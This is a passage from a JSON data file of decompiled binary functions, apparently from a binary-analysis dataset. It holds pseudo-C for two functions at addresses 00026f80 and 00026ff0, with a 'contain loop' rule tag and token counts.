        "decompiled_code": "\nvoid __cdecl fcn.00026f80(uint arg_8h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_20h = 0;\n    var_8h = 0;\n    var_1ch = 9;\n    var_18h = 2;\n    var_10h = &var_ch;\n    var_14h = 4;\n    var_ch = arg_8h;\n    fcn.0002b3f0(0, 0x403, &var_20h, &var_4h, 0, 0, 0);\n    return;\n}\n",
        "token_count": 181
    },
    "00026ff0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.00026ff0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    ulong uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    do {\n        iVar1 = (*0x8005115c)[1];\n        uVar2 = **0x8005115c;\n    } while (iVar1 != (*0x8005115c)[2]);\n    uVar3 = (**0x80051158)(*0x8005115c, uVar2);\n    uVar4 = fcn.00078be2(uVar2, iVar1, uVar3, 0);\n    fcn.00078bee(uVar4, 10000, 0);\n    return;\n}\n",
        "token_count": 205
    }
}